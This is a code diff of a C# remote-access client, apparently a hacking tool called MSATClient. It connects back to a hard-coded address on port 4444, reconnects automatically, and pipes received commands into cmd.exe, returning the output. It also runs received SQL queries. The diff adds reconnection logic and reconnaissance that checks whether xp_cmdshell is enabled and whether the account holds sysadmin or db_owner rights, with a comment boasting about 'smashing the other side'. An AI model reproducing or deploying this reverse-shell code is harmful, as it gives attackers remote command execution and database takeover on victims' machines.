@@ -16,16 +16,21 @@ namespace MSATClient
 {
     class Program
     {
+        static Boolean clientStatus = false;
         static void Main(string[] args)
         {
-            Console.WriteLine("Socket...");
+            Boolean statusSocket = true;
+            Boolean statusTcp = true;
+            //Console.WriteLine("Socket...");
             IPEndPoint serverIP = new IPEndPoint(IPAddress.Parse("192.168.247.1"), 4444);
             Socket tcpClient = null;
             //tcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             GetMessage getMessage = null;
+            
             //System.Diagnostics.Process p = null;
             while (true)
             {
+                getMessage = new GetMessage();
                 /**p = null;
                 p = new System.Diagnostics.Process();
                 p.StartInfo.FileName = "cmd.exe";
@@ -37,26 +42,69 @@ namespace MSATClient
                 p.Start();//启动程序**/
                 try
                 {
-                    tcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                    tcpClient.Connect(serverIP);
-                    Console.WriteLine("连接成功！");
-                    break;
+                    //Console.WriteLine("clientStatus : "+ clientStatus);
+                    if (!clientStatus)
+                    {
+                        Console.WriteLine("监听中...");
+                        tcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        tcpClient.Connect(serverIP);
+                        Console.WriteLine("连接成功！");
+                        getMessage.TcpClient(tcpClient);
+                        clientStatus = true;
+                    }
+
+                    /** 判断Socket是否断开！若断开则重新连接 **/
+                    try
+                    {
+                        byte[] tmp = new byte[1];
+                        //client.Blocking = false;
+                        tcpClient.Send(tmp, 0, 0);
+                    }
+                    catch
+                    {
+                        getMessage.setClientStatus(false);
+                        clientStatus = false;
+                    }
+                    /**statusTcp = getMessage.getClientStatus();
+                    if (statusSocket && statusTcp)
+                    {
+                        clientStatus = true;
+                    }
+                    else
+                    {
+                        clientStatus = false;
+                    }**/
                 }
                 catch(Exception ex)
                 {
                     Console.WriteLine("Socket连接失败或异常中断！EX："+ex.Message);
+                    statusSocket = false;
+                    getMessage.setClientStatus(false);
                 }
                 //p.WaitForExit();//等待程序执行完退出进程
                 //p.Close();
             }
-            getMessage = new GetMessage();
-            getMessage.TcpClient(tcpClient);
+            //getMessage = new GetMessage();
+            //getMessage.TcpClient(tcpClient);
         }
     }
 
     class GetMessage
     {
         static Boolean sqlStatus = false;
+        private Boolean statusTcp = true;
+
+        public void setClientStatus(Boolean Status) 
+        {
+            statusTcp = Status;
+        }
+
+        public Boolean getClientStatus()
+        {
+            //Console.WriteLine("获取到的ClientStatus为：" + clientStatus);
+            return statusTcp;
+        }
+
         //Boolean systeminfoFlag = true;
         #region Tcp连接方式
         /// <summary>
@@ -108,6 +156,14 @@ namespace MSATClient
             {
                 while (true)
                 {
+                    if (!getClientStatus())
+                    {
+                        Console.WriteLine("接收线程-正常退出！！！");
+                        //p.WaitForExit();//等待程序执行完退出进程
+                        //p.StandardInput.WriteLine(" ");
+                        p.Kill();
+                        break;
+                    }
                     String getmess = "";
                     byte[] data = new byte[1024 * 1024 * 3];
                     try
@@ -139,7 +195,7 @@ namespace MSATClient
                             else if (firstFlag == '2') {
                                 try
                                 {
-                                    SqlCommand command = new SqlCommand(mess, conn);
+                                    //SqlCommand command = new SqlCommand(mess, conn);
                                     SqlDataAdapter reader = new SqlDataAdapter(mess, conn);
                                     DataSet dataSet = new DataSet();
                                     reader.Fill(dataSet,"SQL");
@@ -198,13 +254,19 @@ namespace MSATClient
                     }
                     catch (Exception ex)
                     {
+                        statusTcp = false;
+                        //setClientStatus(false);
                         Console.WriteLine("接收消息：TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
-                        p.WaitForExit();//等待程序执行完退出进程
-                        p.Close();
+                        Console.WriteLine("接收消息退出时的ClientStatus为：" + statusTcp);
+                        setClientStatus(false);
+                        //p.WaitForExit();//等待程序执行完退出进程
+                        //p.StandardInput.WriteLine(" ");
+                        p.Kill();
                         break;
                         //System.Environment.Exit(0);
                     }
                 }
+                Console.WriteLine("接收数据线程已关闭！！！");
         }).Start();
 
             //发送数据
@@ -234,8 +296,15 @@ namespace MSATClient
             new Thread(() =>
             {
                 String result = "";
-                while (true)
+                while (statusTcp)
                 {
+                    if (!statusTcp)
+                    {
+                        Console.WriteLine("cmd正常命令-识别成功退出！");
+                        //p.WaitForExit();//等待程序执行完退出进程
+                        //p.Kill();
+                        break;
+                    }
                     try
                     {
                         result = p.StandardOutput.ReadLine();
@@ -244,17 +313,31 @@ namespace MSATClient
                     }
                     catch (Exception ex)
                     {
+                        Console.WriteLine("cmd正常命令-报错退出！");
+                        //p.StandardInput.WriteLine(" ");
+                        //p.WaitForExit();//等待程序执行完退出进程
+                        //p.Kill();
                         break;
                     }
                 }
+                //p.WaitForExit();//等待程序执行完退出进程
+                //p.Kill();
+                Console.WriteLine("CMD正常线程已关闭！！！");
             }).Start();
 
             //cmd命令报错
             new Thread(() =>
             {
                 String result = "";
-                while (true)
+                while (statusTcp)
                 {
+                    if (!statusTcp)
+                    {
+                        Console.WriteLine("cmd命令报错-识别成功退出！");
+                        //p.WaitForExit();//等待程序执行完退出进程
+                        //p.Kill();
+                        break;
+                    }
                     try
                     {
                         result = p.StandardError.ReadLine();
@@ -271,31 +354,27 @@ namespace MSATClient
                     }
                     catch (Exception ex)
                     {
+                        Console.WriteLine("cmd命令报错-报错退出！");
+                        //p.WaitForExit();//等待程序执行完退出进程
+                        //p.Kill();
                         break;
                     }
                 }
+                //p.WaitForExit();//等待程序执行完退出进程
+                //p.Kill();
+                Console.WriteLine("CMD异常线程已关闭！！！");
             }).Start();
+            /**while (true)
+            { 
+                if(!statusTcp)
+                {
+                    p.Kill();
+                    break;
+                }
+            }**/
         }
         #endregion
         
-        public static Byte[] GetStringFormatDataSet(DataSet ds)
-        {
-            //创建内存流
-            MemoryStream memStream = new MemoryStream();
-            //产生二进制序列化格式
-            IFormatter formatter = new BinaryFormatter();
-            //指定DataSet串行化格式是二进制
-            ds.RemotingFormat = SerializationFormat.Binary;
-            //串行化到内存中
-            formatter.Serialize(memStream, ds);
-            //将DataSet转化成byte[]
-            //String mess = memStream.ToString();
-            byte[] binaryResult = memStream.ToArray();
-            //清空和释放内存流
-            memStream.Close();
-            memStream.Dispose();
-            return binaryResult;
-        }
 
         public static void SendMess(Socket tcpClient, String mess , String flag) {
             try
@@ -346,7 +425,47 @@ namespace MSATClient
                 {
                     //Console.WriteLine("数据库已经打开");
                     sqlStatus = true;
-                    SendMess(tcpClient,"数据库连接成功！","9");
+                    //判断权限以及xp_cmdshell是否开启
+                    //SqlCommand command = new SqlCommand("select count(*) FROM sysobjects Where xtype = 'X' AND name = 'xp_cmdshell'", conn); 
+                    SqlDataAdapter reader = new SqlDataAdapter("select count(*) FROM sysobjects Where xtype = 'X' AND name = 'xp_cmdshell'", conn);//是否开启xp_cmdshell
+                    DataSet dataSet = new DataSet();
+                    reader.Fill(dataSet);
+                    if (dataSet.Tables[0].Rows[0]["Column1"].ToString() != "1")
+                    {
+                        mess = "2XP_CMDSHELL：未开启\r\n";
+                    }
+                    else
+                    {
+                        mess = "2XP_CMDSHELL：已开启\r\n";
+                    }
+                    reader = new SqlDataAdapter("select IS_SRVROLEMEMBER('sysadmin')", conn);//是否sa权限
+                    dataSet = new DataSet();
+                    reader.Fill(dataSet);
+                    if (dataSet.Tables[0].Rows[0]["Column1"].ToString() == "1")
+                    {
+                        mess += "Permissions：sa(干翻对面)";
+                    }
+                    else
+                    {
+                        reader = new SqlDataAdapter("select IS_MEMBER('db_owner')", conn);//是否DB_OWNER权限
+                        dataSet = new DataSet();
+                        reader.Fill(dataSet);
+                        if (dataSet.Tables[0].Rows[0]["Column1"].ToString() == "1")
+                        {
+                            mess += "Permissions：DB_OWNER";
+                        }
+                        else
+                        {
+                            mess += "Permissions：public(啥也不是)";
+                        }
+                    }
+                    reader = new SqlDataAdapter("select @@version", conn);//是否sa权限
+                    dataSet = new DataSet();
+                    reader.Fill(dataSet);
+                    //mess = dataSet.GetXml();
+                    SendMess(tcpClient, mess, "1");
+                    SendMess(tcpClient, "3" + dataSet.Tables[0].Rows[0]["Column1"].ToString(), "1");
+                    //SendMess(tcpClient,"数据库连接成功！","9");
                 }
             }
             catch (Exception ex)
